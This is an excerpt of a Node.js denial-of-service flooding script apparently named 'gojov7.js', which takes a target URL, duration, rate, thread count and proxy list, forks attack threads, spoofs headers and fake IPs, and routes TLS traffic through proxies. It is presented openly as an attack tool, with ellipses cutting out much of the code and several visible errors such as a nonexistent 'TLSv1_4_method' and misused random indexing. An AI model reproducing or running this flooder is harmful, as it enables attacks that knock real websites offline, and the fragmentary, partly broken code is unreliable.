//npm i net http2 tls cluster url crypto user-agents fs header-generator fake-useragent
 ...
 if (process.argv.length < 7){console.log(`node gojov7.js target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`[\x1b[35mGOJO9\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[35mGOJO9\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[35mGOJO9\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[35mGOJO9\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}
...
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
`);
  console.log(`\x1b[96mGOJO TEST DDOS\x1b[0m`);
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[\x1b[35mGOJO9\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[\x1b[35mGOJO9\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[\x1b[35mGOJO9\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
...
const uap = [
 ...
 var accept = accept_header[Math.floor(Math.random() * accept_header)];
 var encoding = encoding_header[Math.floor(Math.random() * encoding_header)];
 var controle = controle_header[Math.floor(Math.random() * controle_header)];
 var 
...
headers["TE"] = "trailers";
headers["access-control-allow-origin"] = randomHeaders["*"];
headers["access-control-allow-credentials"] = randomHeaders["true"];
headers["content-length"] = randomHeaders["239"];
headers["x-backend-header-rtt"] = randomHeaders["0.002516"];
headers["strict-transport-security"] = randomHeaders["max-age=31536000"];
...
headers["cache-control"] = controle;
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
    ...
    process.on('unhandledRejection', function(er) {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         const tlsOptions = {
            ...
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method", "TLSv1_4_method"],
